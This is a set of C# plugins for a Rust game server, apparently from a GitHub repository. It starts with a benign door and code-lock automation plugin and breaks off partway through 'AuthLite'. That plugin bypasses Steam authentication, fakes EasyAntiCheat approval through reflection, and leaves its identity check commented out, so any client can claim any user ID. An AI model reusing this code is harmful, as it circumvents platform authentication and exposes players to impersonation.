        [PluginReference] private Plugin Clans;

        #region Variables

        private StoredData _data;
        private ConfigData _config;

        private readonly FieldInfo _serverInput = typeof(BasePlayer).GetField("serverInput",
            (BindingFlags.Public | BindingFlags.Static | BindingFlags.Instance | BindingFlags.NonPublic));

        private readonly Vector3 _eyesAdjust = new Vector3(0f, 1.5f, 0f);
        private bool _dataLoaded;

        private readonly FieldInfo _hasCode = typeof(CodeLock).GetField("hasCode",
            (BindingFlags.Public | BindingFlags.Static | BindingFlags.Instance | BindingFlags.NonPublic));

        #endregion

        #region Configuration

        private class ConfigData
        {
            [JsonProperty("Команда для замков")] public string codelockCommand { get; set; }
            [JsonProperty("Команда для дверей ")] public string doorsCommand { get; set; }
            [JsonProperty("Привилегии")] public Permissions permissions { get; set; }
            [JsonProperty("Настройки")] public Settings settings { get; set; }
        }

        private class Permissions
        {
            [JsonProperty("Привилегия для дверей")]
            public string permissionDeployDoor { get; set; }

            [JsonProperty("Привилегия для ящиков")]
            public string permissionDeployBox { get; set; }

            [JsonProperty("Привилегия для шкафов с одеждой")]
            public string permissionDeployLocker { get; set; }

            [JsonProperty("Привилегия для шкафа")] public string permissionDeployCupboard { get; set; }

            [JsonProperty("Привилегия для автозакрытия замка")]
            public string permissionAutoLock { get; set; }

            [JsonProperty("Привилегия для установки замка без замка :)")]
            public string permissionNoLockNeed { get; set; }

            [JsonProperty("Привилегия для автозакрывания двери")]
            public string permissionAutoCloseDoor { get; set; }

            [JsonProperty("Привилегия для умного дома")]
            public string permissionSmartHome { get; set; }
        }

        private class Settings
        {
            [JsonProperty("Автозакрытие замка")] public bool AutoLock { get; set; }

            [JsonProperty("Авто установка на двери")]
            public bool DeployDoor { get; set; }

            [JsonProperty("Авто установка на ящики")]
            public bool DeployBox { get; set; }

            [JsonProperty("Авто установка на шкафы с одеждой")]
            public bool DeployLocker { get; set; }

            [JsonProperty("Авто установка на шкаф")]
            public bool DeployCupboard { get; set; }

            [JsonProperty("Задержка закрытия двери")]
            public float defaultDelay { get; set; }

            [JsonProperty("Автозакрытие дверей")] public bool autoDoor { get; set; }
        }

        protected override void LoadDefaultConfig()
        {
            var config = new ConfigData
            {
                codelockCommand = "code",
                doorsCommand = "ad",
                permissions = new Permissions
                {
                    permissionDeployDoor = Name + ".deploydoor",
                    permissionDeployBox = Name + ".deploybox",
                    permissionDeployLocker = Name + ".deploylocker",
                    permissionDeployCupboard = Name + ".deploycup",
                    permissionAutoLock = Name + ".autolock",
                    permissionNoLockNeed = Name + ".nolockneed",
                    permissionAutoCloseDoor = Name + ".autoclose",
                    permissionSmartHome = Name + ".smarthome",

                },
                settings = new Settings
                {
                    AutoLock = true,
                    DeployDoor = true,
                    DeployBox = true,
                    DeployLocker = true,
                    DeployCupboard = true,
                    autoDoor = true,
                    defaultDelay = 5f
                }
            };
            SaveConfig(config);
            PrintWarning("Creating default a configuration file ...");
        }

        private void LoadConfigVariables() => _config = Config.ReadObject<ConfigData>();
        private void SaveConfig(ConfigData config) => Config.WriteObject(config, true);

        #endregion

        #region Oxide
        
        private void Loaded()
        {
            LoadConfigVariables();
            cmd.AddChatCommand(_config.codelockCommand, this, "CodeLockCommand");
            cmd.AddChatCommand(_config.doorsCommand, this, "AutoDoorCommand");
        }

        private void OnServerInitialized()
        {
            if (!_dataLoaded) LoadData();
            RegisterPermissions();
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (!_data.PlayerInfo.ContainsKey(player.userID)) AddNewPlayer(player);
            }
        }

        private void OnPlayerConnected(BasePlayer player)    
        {
            if (!_data.PlayerInfo.ContainsKey(player.userID)) AddNewPlayer(player);
        }

        private void OnDoorOpened(Door door, BasePlayer player)
        {
            if (door == null || player == null) return;
            if (!permission.UserHasPermission(player.UserIDString, _config.permissions.permissionAutoCloseDoor))
            {
                //Puts(permission.UserHasPermission(player.UserIDString, _config.permissions.permissionAutoCloseDoor).ToString());
                return;
            }
            if (door.GetComponentInChildren<DoorCloser>() != null) return;
            if (_data.DoorsList.Contains(door.net.ID)) return;
            var time = 0f;
            if (_data.PlayerInfo.ContainsKey(player.userID))
            {
                if (!_data.PlayerInfo[player.userID].AutoDoor) return;
                time = _data.PlayerInfo[player.userID].DefaultDelay;
            }
            else
            {
                if (!_config.settings.AutoLock) return;
                time = _config.settings.defaultDelay;
            }

            if (time == 0f) return;
            timer.Once(time, () => CloseDoor(door));

        }

        private void OnItemDeployed(Deployer deployer, BaseEntity entity)
        {
            if (deployer.GetOwnerPlayer() == null || deployer.GetModDeployable() == null ||
                deployer.GetModDeployable().name == "doorcloser.item" || !entity.HasSlot(BaseEntity.Slot.Lock) ||
                !(entity.GetSlot(BaseEntity.Slot.Lock) is CodeLock)) return;
            var owner = deployer.GetOwnerPlayer();
            if (!permission.UserHasPermission(owner.UserIDString, _config.permissions.permissionAutoLock) ||
                !_data.PlayerInfo[owner.userID].AutoLock) return;
            var codelock = entity.GetSlot(BaseEntity.Slot.Lock) as CodeLock;
            if (codelock == null) return;
            codelock.code = Convert.ToString(_data.PlayerInfo[owner.userID].Password != 0
                ? _data.PlayerInfo[owner.userID].Password
                : UnityEngine.Random.Range(1234, 9876));
            _hasCode.SetValue(codelock, true);
            codelock.whitelistPlayers.Add(owner.userID);
            codelock.SetFlag(BaseEntity.Flags.Locked, true);
            Effect.server.Run("assets/prefabs/locks/keypad/effects/lock.code.updated.prefab",
                entity.transform.position);
            var code = codelock.code;
            if (owner.net.connection.info.GetBool("global.streamermode")) code = "****";
            SendReply(owner, string.Format(Msg("CodeAuth", owner), code)); //Изменено
        }

        private void OnEntityBuilt(Planner planner, GameObject obj)
        {
            if (planner == null || planner.GetOwnerPlayer() == null ||
                obj.GetComponent<BaseEntity>() == null || obj.GetComponent<BaseEntity>().OwnerID == 0) return;
            var entity = obj.GetComponent<BaseEntity>();
            var player = planner.GetOwnerPlayer();
            if (player == null || !_data.PlayerInfo.ContainsKey(player.userID)) return;
            if (entity is Door && (entity as Door).canTakeLock)
            {
                if (permission.UserHasPermission(player.UserIDString, _config.permissions.permissionDeployDoor) &&
                    _data.PlayerInfo[player.userID].DeployDoor) LockPlacing(player, entity);
            }
            else if (entity is BoxStorage && entity.HasSlot(BaseEntity.Slot.Lock))
            {
                if (permission.UserHasPermission(player.UserIDString, _config.permissions.permissionDeployBox) &&
                    _data.PlayerInfo[player.userID].DeployBox) LockPlacing(player, entity);
            }
            else if (entity is Locker && entity.HasSlot(BaseEntity.Slot.Lock))
            {
                if (permission.UserHasPermission(player.UserIDString, _config.permissions.permissionDeployLocker) &&
                    _data.PlayerInfo[player.userID].DeployLocker) LockPlacing(player, entity);
            }
            else if (entity is BuildingPrivlidge && entity.HasSlot(BaseEntity.Slot.Lock))
            {
                if (permission.UserHasPermission(player.UserIDString, _config.permissions.permissionDeployCupboard) &&
                    _data.PlayerInfo[player.userID].DeployCupboard) LockPlacing(player, entity);
            }
        }

        private void OnNewSave()
        {
            LoadData();
            _data.DoorsList.Clear();
            SaveData();
        }

        private void OnServerSave() => SaveData();

        private void Unload() => SaveData();

        #endregion

        #region Functions
        bool IsClanMember(ulong playerid = 294912, ulong targetID = 0) => (bool)(Clans?.Call("HasFriend", playerid, targetID) ?? false);

        private void CloseDoor(BaseEntity door)
        {
            if (door == null || !door.IsOpen()) return;
            door.SetFlag(BaseEntity.Flags.Open, false);
            door.SendNetworkUpdateImmediate();
        }

        private static BaseEntity DoRay(Vector3 pos, Vector3 aim)
        {
            var hits = Physics.RaycastAll(pos, aim);
            var distance = 3f;
            BaseEntity target = null;
            foreach (var hit in hits)
            {
                if (!(hit.distance < distance)) continue;
                distance = hit.distance;
                target = hit.GetEntity();
            }

            return target;
        }
    
        private void AutoDoorCommand(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            if (!permission.UserHasPermission(player.UserIDString, _config.permissions.permissionAutoCloseDoor))
            {
                SendReply(player,
                    Msg("NoAccess", player));
                return;
            }

            SetDoor(player);
        }

        private void SetDoor(BasePlayer player)
        {
            var input = _serverInput.GetValue(player) as InputState;
            if (input == null) return;
            var currentRot = Quaternion.Euler(input.current.aimAngles) * Vector3.forward;
            var entity = DoRay(player.transform.position + _eyesAdjust, currentRot);
            var door = entity as Door;
            if (door == null)
            {
                if (!_data.PlayerInfo.ContainsKey(player.userID)) AddNewPlayer(player);
                _data.PlayerInfo[player.userID].AutoDoor = !_data.PlayerInfo[player.userID].AutoDoor;
                SaveData();
                SendReply(player,
                    _data.PlayerInfo[player.userID].AutoDoor
                        ? Msg("AllAutoCloseEnabled", player)
                        : Msg("AllAutoCloseDisabled", player));
                return;
            }

            SwitchDoor(player, door);
        }

        private void SwitchDoor(BasePlayer player, BaseNetworkable door)
        {
            if (door == null || door.net == null) return;
            if (!permission.UserHasPermission(player.UserIDString, _config.permissions.permissionAutoCloseDoor)) return;

            if (_data.DoorsList.Contains(door.net.ID))
            {
                _data.DoorsList.Remove(door.net.ID);
                SendReply(player,
                    Msg("AutoCloseEnabled", player));
            }
            else
            {
                _data.DoorsList.Add(door.net.ID);
                SendReply(player,
                    Msg("AutoCloseDisabled", player));
            }

            SaveData();
        }

        private void RegisterPermissions()
        {
            if (!permission.PermissionExists(_config.permissions.permissionDeployDoor))
                permission.RegisterPermission(_config.permissions.permissionDeployDoor, this);
            if (!permission.PermissionExists(_config.permissions.permissionAutoLock))
                permission.RegisterPermission(_config.permissions.permissionAutoLock, this);
            if (!permission.PermissionExists(_config.permissions.permissionDeployBox))
                permission.RegisterPermission(_config.permissions.permissionDeployBox, this);
            if (!permission.PermissionExists(_config.permissions.permissionDeployLocker))
                permission.RegisterPermission(_config.permissions.permissionDeployLocker, this);
            if (!permission.PermissionExists(_config.permissions.permissionDeployCupboard))
                permission.RegisterPermission(_config.permissions.permissionDeployCupboard, this);
            if (!permission.PermissionExists(_config.permissions.permissionAutoCloseDoor))
                permission.RegisterPermission(_config.permissions.permissionAutoCloseDoor, this);
            if (!permission.PermissionExists(_config.permissions.permissionNoLockNeed))
                permission.RegisterPermission(_config.permissions.permissionNoLockNeed, this);
            if (!permission.PermissionExists(_config.permissions.permissionSmartHome))
                permission.RegisterPermission(_config.permissions.permissionSmartHome, this);
        }

        private void AddNewPlayer(BasePlayer player)
        {
            if (_data.PlayerInfo.ContainsKey(player.userID)) return;

            var info = new PlayerInfo
            {
                AutoLock = _config.settings.AutoLock,
                DeployDoor = _config.settings.DeployDoor,
                DeployBox = _config.settings.DeployBox,
                DeployLocker = _config.settings.DeployLocker,
                DeployCupboard = _config.settings.DeployCupboard,
                AutoDoor = _config.settings.autoDoor,
                DefaultDelay = _config.settings.defaultDelay,
                Password = UnityEngine.Random.Range(1000, 9999)
            };
            _data.PlayerInfo.Add(player.userID, info);
            SaveData();
        }

        private void SetPlayerData(BasePlayer player, int Code, bool AutoLock = true, bool DeployDoor = true,
            bool DeployBox = true, bool DeployLocker = true, bool DeployCupboard = true, bool autoDoor = true,
            float defaultDelay = 5f)
        {
            if (player == null) return;
            if (_data.PlayerInfo.ContainsKey(player.userID)) _data.PlayerInfo.Remove(player.userID);
            var info = new PlayerInfo
            {
                AutoLock = AutoLock,
                DeployDoor = DeployDoor,
                DeployBox = DeployBox,
                DeployLocker = DeployLocker,
                DeployCupboard = DeployCupboard,
                AutoDoor = autoDoor,
                DefaultDelay = defaultDelay,
                Password = Code == 0 ? UnityEngine.Random.Range(1000, 9999) : Code
            };
            _data.PlayerInfo.Add(player.userID, info);
            SaveData();
        }

        private PlayerInfo GetPlayerData(BasePlayer player)
        {
            if (player == null) return null;
            if (!_data.PlayerInfo.ContainsKey(player.userID)) AddNewPlayer(player);
            return _data.PlayerInfo[player.userID];
        }

        private void LockPlacing(BasePlayer player, BaseEntity entity)
        {
            if (!permission.UserHasPermission(player.UserIDString, _config.permissions.permissionNoLockNeed) &&
                player.inventory.Take(null, 1159991980, 1) == 0)
            {
                return;
            }

            var codeLock = GameManager.server.CreateEntity("assets/prefabs/locks/keypad/lock.code.prefab",
                new Vector3(), new Quaternion(), true) as CodeLock;
            if (codeLock == null) return;
            codeLock.gameObject.Identity();
            codeLock.SetParent(entity, entity.GetSlotAnchorName(BaseEntity.Slot.Lock));
            codeLock.OnDeployed(entity, player);
            codeLock.Spawn();
            entity.SetSlot(BaseEntity.Slot.Lock, codeLock);
            if (!permission.UserHasPermission(player.UserIDString, _config.permissions.permissionAutoLock) ||
                !_data.PlayerInfo[player.userID].AutoLock) return;
            codeLock.code = Convert.ToString(_data.PlayerInfo[player.userID].Password != 0
                ? _data.PlayerInfo[player.userID].Password
                : UnityEngine.Random.Range(1234, 9876));
            _hasCode.SetValue(codeLock, true);
            codeLock.whitelistPlayers.Add(player.userID);
            var clanList = Clans?.Call<List<string>>("GetClanMembers", player.userID);
            if (clanList != null && clanList.Count > 0)
            {
                foreach (var clanuser in clanList)
                {
                    codeLock.whitelistPlayers.Add(ulong.Parse(clanuser));
                } 
            }
            else
            {
                codeLock.whitelistPlayers.Add(player.userID);
            }
            if (RelationshipManager.ServerInstance.FindPlayersTeam(player.userID) != null)
            {
                foreach (var playerID in player.Team.members)
                {
                    codeLock.whitelistPlayers.Add(playerID);

                }
            }
            codeLock.SetFlag(BaseEntity.Flags.Locked, true);
            Effect.server.Run("assets/prefabs/locks/keypad/effects/lock.code.updated.prefab",
                entity.transform.position);
            var code = codeLock.code;
            if (player.net.connection.info.GetBool("global.streamermode")) code = "****";
            SendReply(player, string.Format(Msg("CodeAuth", player), code));
        }

        private void CodeLockCommand(BasePlayer player, string command, string[] args)
        {
            if (!permission.UserHasPermission(player.UserIDString, _config.permissions.permissionAutoLock) &&
                !permission.UserHasPermission(player.UserIDString, _config.permissions.permissionDeployDoor) &&
                !permission.UserHasPermission(player.UserIDString, _config.permissions.permissionDeployBox) &&
                !permission.UserHasPermission(player.UserIDString, _config.permissions.permissionDeployLocker) &&
                !permission.UserHasPermission(player.UserIDString, _config.permissions.permissionDeployCupboard))
            {
                SendReply(player,
                    Msg("NoAccess", player));
                return;
            }

            if (args.Length == 0)
            {
                var sb = new StringBuilder();
                sb.AppendLine(string.Format(Msg("CommandUsage", player), _config.codelockCommand));
                if (permission.UserHasPermission(player.UserIDString, _config.permissions.permissionAutoLock))
                    sb.AppendLine(String.Format(Msg("CommandAutolock", player), "auto", _data.PlayerInfo[player.userID].AutoLock
                                      ? "ON"
                                      : "OFF"));
                var pin = Convert.ToString(_data.PlayerInfo[player.userID].Password);
                if (player.net.connection.info.GetBool("global.streamermode")) pin = "****";
                sb.AppendLine(String.Format(Msg("CommandPinCode", player),"pin", _data.PlayerInfo[player.userID].Password > 0
                    ? pin
                    : Msg("CommandPinCodeNotSet", player)));
                SendReply(player, sb.ToString().TrimEnd());
                return;
            }

            switch (args[0].ToLower())
            {
                case "auto":
                    _data.PlayerInfo[player.userID].AutoLock = !_data.PlayerInfo[player.userID].AutoLock;
                        SendReply(player,
                            (_data.PlayerInfo[player.userID].AutoLock
                                ? Msg("AutoLockEnabled", player)
                                : Msg("AutoLockDisabled", player)));//Изменено
                    break;
               case "pin":
                    int pin;
                    if (args.Length != 2) goto case "noaccess";
                    //Puts(int.TryParse(args[1], out pin).ToString());
                    if (int.TryParse(args[1], out pin) == false || int.Parse(args[1]) > 9999 || int.Parse(args[1]) < 1000) goto case "badargument";
                    _data.PlayerInfo[player.userID].Password = pin;
                    SendReply(player, string.Format(Msg("CommandPinCodeSetTo", player), pin));
                    break;
                case "noaccess":
                    SendReply(player, string.Format(Msg("CommandPinCodeHelp", player), _config.codelockCommand));
                    break;
                 case "badargument":
                     SendReply(player, string.Format(Msg("BadFormatPin", player), args[1]));
                    break;
                    
                default:
                    SendReply(player, string.Format(Msg("NotSupported", player), args[0]));
                    break;
            }
        }
        
        #endregion

        #region Data
        private void SaveData() => Interface.Oxide.DataFileSystem.WriteObject(Name, _data);

        private void LoadData()
        {
            try
            {
                _data = Interface.Oxide.DataFileSystem.ReadObject<StoredData>(Name);
            }
            catch (Exception e)
            {
                PrintError(e.ToString());
            }

            if (_data == null) _data = new StoredData();
            _dataLoaded = true;
        }
        class StoredData
        {
            public Dictionary<ulong, PlayerInfo> PlayerInfo = new Dictionary<ulong, PlayerInfo>();
            public List<uint> DoorsList = new List<uint>();
        }
        
        class PlayerInfo
        {
            public bool AutoLock;
            public bool DeployDoor;
            public bool DeployBox;
            public bool DeployLocker;
            public bool DeployCupboard;
            public int Password;
            public bool AutoDoor;
            public float DefaultDelay;
        }
        #endregion

        #region Localization
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(
                new Dictionary<string, string>
                {
                    {"AllAutoCloseEnabled", "<color=#00FFFF></color><color=#FFFFFF> Automatic doors closing for you is enabled</color>"},
                    {"AllAutoCloseDisabled", "<color=#00FFFF></color><color=#FFFFFF> Automatic doors closing for you is disabled</color>"},
                    {"BadFormatPin", "<color=#00FFFF></color><color=#FFFFFF> Error syntax pin: <color=#FF0000>{0}</color></color>"},
                    {"AutoCloseEnabled", "<color=#00FFFF></color><color=#FFFFFF> Automatic closing of <color=#00FF00>THIS DOOR</color> for all authorized players is enabled</color>"},
                    {"AutoCloseDisabled", "<color=#00FFFF></color><color=#FFFFFF> Automatic closing of <color=#FF0000>THIS DOOR</color> for all authorized players is disabled</color>"},
                    {"AutoLockEnabled", "<color=#00FFFF></color><color=#FFFFFF> CodeLock automation (secure and lock) enabled</color>"},
                    {"AutoLockDisabled", "<color=#00FFFF></color><color=#FFFFFF> CodeLock automation disabled</color>"},
                    {"DeployLockDoorEnabled", "<color=#00FFFF></color><color=#FFFFFF> Doors will include codelocks on deploy</color>"},
                    {"DeployLockDoorDisabled", "<color=#00FFFF></color><color=#FFFFFF> Doors will not include codelocks on deploy</color>"},
                    {"DeployLockBoxEnabled", "<color=#00FFFF></color><color=#FFFFFF> Boxes will include codelocks on deploy</color>"},
                    {"DeployLockBoxDisabled", "<color=#00FFFF></color><color=#FFFFFF> Boxes will not include codelocks on deploy</color>"},
                    {"DeployLockLockerEnabled", "<color=#00FFFF></color><color=#FFFFFF> Locker will include codelocks on deploy</color>"},
                    {"DeployLockLockerDisabled", "<color=#00FFFF></color><color=#FFFFFF> Locker will not include codelocks on deploy</color>"},
                    {"DeployLockCupEnabled", "<color=#00FFFF></color><color=#FFFFFF> Cupboards will include codelocks on deploy</color>"},
                    {"DeployLockCupDisabled", "<color=#00FFFF></color><color=#FFFFFF> Cupboards will not include codelocks on deploy</color>"},
                    {"CodeAuth", "<color=#00FFFF></color><color=#FFFFFF> CodeLock secured and locked with <color=#00FF00>{0}</color></color>"},
                    {"NoAccess", "<color=#00FFFF></color><color=#FFFFFF> You are not granted for this feature</color>"},
                    {"NotSupported", "<color=#00FFFF></color><color=#FFFFFF> The specific function <color=#FF0000>{0}</color> is not available</color>"},
                    {"CommandUsage", "<color=#FFFFFF>Command usage: <color=#00FF00>{0}</color></color>"},
                    {"CommandToggle", "<color=#FFFFFF>All switches toggle their setting (on<>off)</color>"},
                    {"CommandAutolock", "<color=#FFFFFF><color=#00FF00>{0}</color> - Autolock feature: <color=#00FF00>{1}</color></color>"}, 
                    {"CommandPinCode", "<color=#FFFFFF><color=#00FF00>{0}</color> - Your current PIN: <color=#00FF00>{1}</color></color>"},
                    {"CommandPinCodeNotSet", "<color=#FFFFFF>Random 8-Digits</color>"},
                    {"CommandPinCodeSetTo", "<color=#00FFFF></color><color=#FFFFFF> Your Pin was succesful set to: <color=#00FF00>{0}</color></color>"},
                    {"CommandPinCodeHelp", "<color=#00FFFF></color><color=#FFFFFF> Set your PIN with <color=#00FF00>/{1} pin 1234</color> (4-Digits)"},
                    {"CommandDeployDoor", "<color=#FFFFFF> Deploy with Door:</color>"}, 
                    {"CommandDeployBox", "<color=#FFFFFF> Deploy with Box:</color>"},
                    {"CommandDeployLocker", "<color=#FFFFFF> Deploy with Locker:</color>"}, 
                    {"CommandDeployCupboard", "<color=#FFFFFF> Deploy with Cupboard:</color>"},
                }, this);
        lang.RegisterMessages(
                new Dictionary<string, string>
                {
                    {"AllAutoCloseEnabled", "<color=#00FFFF></color><color=#FFFFFF> Автоматическое закрытие всех дверей для Вас <color=#00FF00>ВКЛЮЧЕНО</color></color>"},
                    {"AllAutoCloseDisabled", "<color=#00FFFF></color><color=#FFFFFF> Автоматическое закрытие всех дверей для Вас <color=#FF0000>ВЫКЛЮЧЕНО</color></color>"},
                    {"BadFormatPin", "<color=#00FFFF></color><color=#FFFFFF> Неправильный формат пароля: <color=#FF0000>{0}</color></color>"},
                    {"AutoCloseEnabled", "<color=#00FFFF></color><color=#FFFFFF> Автоматическое закрытие <color=#00FF00>ЭТОЙ ДВЕРИ</color> для всех авторизованных игроков <color=#00FF00>ВКЛЮЧЕНО</color></color>"},
                    {"AutoCloseDisabled", "<color=#00FFFF></color><color=#FFFFFF> Автоматическое закрытие <color=#FF0000>ЭТОЙ ДВЕРИ</color> для всех авторизованных игроков <color=#FF0000>ВЫКЛЮЧЕНО</color></color>"},
                    {"AutoLockEnabled", "<color=#00FFFF></color><color=#FFFFFF> Автоматическая установка замка с паролем <color=#00FF00>ВКЛЮЧЕНА</color></color>"},
                    {"AutoLockDisabled", "<color=#00FFFF></color><color=#FFFFFF> Автоматическая установка замка с паролем <color=#FF0000>ВЫКЛЮЧЕНА</color></color>"},
                    {"DeployLockDoorEnabled", "<color=#00FFFF></color><color=#FFFFFF> Замки <color=#00FF00>будут</color> автоматически устанавливаться на двери</color>"},
                    {"DeployLockDoorDisabled", "<color=#00FFFF></color><color=#FFFFFF> Замки <color=#FF0000>не будут</color> автоматически устанавливаться на двери</color>"},
                    {"DeployLockBoxEnabled", "<color=#00FFFF></color><color=#FFFFFF> Замки <color=#00FF00>будут</color> автоматически устанавливаться на ящики</color>"},
                    {"DeployLockBoxDisabled", "<color=#00FFFF></color><color=#FFFFFF> Замки <color=#FF0000>не будут</color> автоматически устанавливаться на ящики</color>"},
                    {"DeployLockLockerEnabled", "<color=#00FFFF></color><color=#FFFFFF> Замки <color=#00FF00>будут</color> автоматически устанавливаться на шкафы с одеждой</color>"},
                    {"DeployLockLockerDisabled", "<color=#00FFFF></color><color=#FFFFFF> Замки <color=#FF0000>не будут</color> автоматически устанавливаться на шкафы с одеждой</color>"},
                    {"DeployLockCupEnabled", "<color=#00FFFF></color><color=#FFFFFF> Замки <color=#00FF00>будут</color> автоматически устанавливаться на шкафы</color>"},
                    {"DeployLockCupDisabled", "<color=#00FFFF></color><color=#FFFFFF> Замки <color=#FF0000>не будут</color> автоматически устанавливаться на шкафы</color>"},
                    {"CodeAuth", "<color=#00FFFF></color><color=#FFFFFF> Замок установлен! Пароль <color=#00FF00>{0}</color></color>"},
                    {"NoAccess", "<color=#00FFFF></color><color=#FFFFFF> У вас нету привилегии для использования команды</color>"},
                    {"NotSupported", "<color=#00FFFF></color><color=#FFFFFF> Функция <color=#FF0000>{0}</color> недоступна!</color>"},
                    {"CommandUsage", "<color=#FFFFFF>Команда: <color=#00FF00>{0}</color></color>"},
                    {"CommandToggle", "<color=#FFFFFF>Используется переключение <color=#00FF00>ON/OFF</color></color>"},
                    {"CommandAutolock", "<color=#FFFFFF><color=#00FF00>{0}</color> - значение: <color=#00FF00>{1}</color></color>"}, 
                    {"CommandPinCode", "<color=#FFFFFF><color=#00FF00>{0}</color> - Текущий пароль: <color=#00FF00>{1}</color></color>"},    
                    {"CommandPinCodeNotSet", "<color=#FFFFFF>Случайные 8 цифр</color>"},
                    {"CommandPinCodeSetTo", "<color=#00FFFF></color><color=#FFFFFF> Ваш пароль: <color=#00FF00>{0}</color>"},
                    {"CommandPinCodeHelp", "<color=#00FFFF></color><color=#FFFFFF> Установить пароль <color=##00FF00>/{1} pin 1234</color> (4 цифры)</color>"},
                    {"CommandDeployDoor", "<color=#FFFFFF> Установка на двери:</color>"}, 
                    {"CommandDeployBox", "<color=#FFFFFF> Установка на ящики:</color>"},
                    {"CommandDeployLocker", "<color=#FFFFFF> Установка на шкаф с одеждой:</color>"}, 
                    {"CommandDeployCupboard", "<color=#FFFFFF> Установка на шкаф:</color>"},
                }, this, "ru");
        }    
        private string Msg(string key, BasePlayer player = null) =>
            lang.GetMessage(key, this, player.UserIDString);
        #endregion    
        
    }
}

// --- End of file: DoorsControl.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/AuthLite.cs ---
// --- Original Local Path: HudRust/AuthLite.cs ---

using System;
using System.IO;
using System.Collections.Generic;
using System.Collections;
using Network;
using Oxide.Core;
using Oxide.Core.Libraries;
using UnityEngine;
using System.Reflection;

namespace Oxide.Plugins
{
    [Info("AuthLite", "DeathGX & ShadowRemove", "0.5")]
    [Description("Automatic id authentication")]
	/*
	this plugin detects no steam players
	*/
    public class AuthLite : RustPlugin
    {
		
		Dictionary<ulong,string> users=new Dictionary<ulong,string>();
		Dictionary<ulong,string> lastSaved=new Dictionary<ulong,string>();
		
		//discord webhook on user approved
		string id = "";
		string token = "";
		
		void Webhook(string msg) {
			if (id=="") return;
			/*webrequest.Enqueue(
				"http://localhost?query=webhook&id="+id+"&token="+token
				+"&msg="+UnityEngine.Networking.UnityWebRequest.EscapeURL(msg), null, (code, response) =>
			{*/
			string[] parameters = new string[]{
				"content="+UnityEngine.Networking.UnityWebRequest.EscapeURL(msg),
				"username=AuthLite"
			};
			
			string body = string.Join("&", parameters);
			
			webrequest.Enqueue("https://discord.com/api/webhooks/"+id+"/"+token, body, (code, response) =>
			{
				if (code != 200 || response == null)
				{
					Puts($"Couldn't get an answer!");
					return;
				}
				Puts($"Webhook answered: {response}");
			}, this, RequestMethod.POST);
		}
        void OnServerInitialized()
        {
			
			
			Rust.Defines.appID = 252490U;
			ConVar.Server.encryption = 1;
			ConVar.App.port = -1;
			//global::EACServer.easyAntiCheat=null;
			//ConVar.Server.secure=false;
            users = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, string>>("AuthLite/Users");
			Debug.Log("[AuthLite] read "+users.Count+" users");
			//server.port=-1;
			
        }
		bool EqualUsers(Dictionary<ulong,string> a, Dictionary<ulong,string> b) {
			if (a.Count!=b.Count) return false;
			foreach( KeyValuePair<ulong, string> u in a )
			{
				if (!b.ContainsKey(u.Key)) return false;
				if (u.Value!=b[u.Key]) return false;
			}
			return true;
		}
		void OnServerSave() 
        {
			if (!EqualUsers(users,lastSaved)) {
				lastSaved = new Dictionary<ulong,string>(users);
				Debug.Log("[AuthLite] write "+users.Count+" users");
				Interface.Oxide.DataFileSystem.WriteObject("AuthLite/Users", users);
			}
        }
		object OnUserApprove(Connection conn) {
            /*
            ulong conn.userid
            byte[] conn.token
            string conn.username
            string conn.ipadress
            global::ConnectionAuth.Reject(connection, "You are not allowed to join ;)", null);
            */
			string[] port=conn.ipaddress.Split(':');
			string ipName=conn.ipaddress.Replace(port[1],conn.username);
			if (users.ContainsKey(conn.userid)) {
				//login
				/*if (users[conn.userid] != ipName) {
					Debug.Log("[AuthLite] User "+conn.username+" Fail to Login");
					return null;//normal auth
				}*/
				
				Debug.Log("[AuthLite] User "+conn.username+" Login");
				
			} else {
				//register
				Debug.Log("[AuthLite] User "+conn.username+" Registered");
				users[conn.userid]=ipName;
			}
			
			global::ConnectionAuth.m_AuthConnection.Add(conn);
			
			ConnectionAuth auth=GameObject.FindObjectOfType<ConnectionAuth>();
			/*
			GameObject[] gos = (GameObject[])GameObject.FindObjectsOfType(GameObject);
            
             for (int i = 0; i < gos.Length; ++i)
             {
                 auth = (typeof(ConnectionAuth)) gos[i].GetComponent(typeof(ConnectionAuth));
                 if (auth!=null) {
                    break;
                 }
             }
			*/
			auth.StartCoroutine(AuthRoutine(conn,auth));
			
            return "Talk shit get hit";//if this value is not null breaks the steam auth
        }
		public static IEnumerator EAC(Connection connection)
		{
			connection.authStatus = string.Empty;
			
			global::EACServer.OnJoinGame(connection);
			while (connection.active && !connection.rejected && connection.authStatus == string.Empty)
			{
				yield return null;
			}
			yield break;
		}
		public static IEnumerator FakeSteam(Connection connection) {
		/*connection.authStatus = "";
			if (!PlatformService.Instance.BeginPlayerSession(connection.userid, connection.token))
		{*/
			
			 MethodInfo authLocal = typeof(EACServer).GetMethod("OnAuthenticatedLocal", BindingFlags.Static | BindingFlags.NonPublic);
			MethodInfo authRemote = typeof(EACServer).GetMethod("OnAuthenticatedRemote", BindingFlags.Static | BindingFlags.NonPublic);
			
					authLocal.Invoke(null, new object[]
					{
						connection
					});
					authRemote.Invoke(null, new object[]
					{
						connection
					});
				//no steam player
			//Debug.Log("[AuthLite]NoSteam Player");
				connection.authStatus = "ok";
				yield return null;
				yield return null;
				yield return null;
				/*connection.rejected = false;
				connection.active = true;
				connection.authLevel = 0U;*/
		//}
			/*global::Auth_Steam.waitingList.Add(connection);
			Stopwatch timeout = Stopwatch.StartNew();
			while (timeout.Elapsed.TotalSeconds < 30.0 && connection.active && !(connection.authStatus != ""))
			{
				yield return null;
			}
			global::Auth_Steam.waitingList.Remove(connection);
			if (!connection.active)
			{
				yield break;
			}
			if (connection.authStatus.Length == 0)
			{
				global::ConnectionAuth.Reject(connection, "Steam Auth Timeout", null);
				PlatformService.Instance.EndPlayerSession(connection.userid);
				yield break;
			}
			if (connection.authStatus == "banned")
			{
				global::ConnectionAuth.Reject(connection, "Auth: " + connection.authStatus, null);
				PlatformService.Instance.EndPlayerSession(connection.userid);
				yield break;
			}
			if (connection.authStatus == "gamebanned")
			{
				global::ConnectionAuth.Reject(connection, "Steam Auth: " + connection.authStatus, null);
				PlatformService.Instance.EndPlayerSession(connection.userid);
				yield break;
			}
			if (connection.authStatus == "vacbanned")
			{
				global::ConnectionAuth.Reject(connection, "Steam Auth: " + connection.authStatus, null);
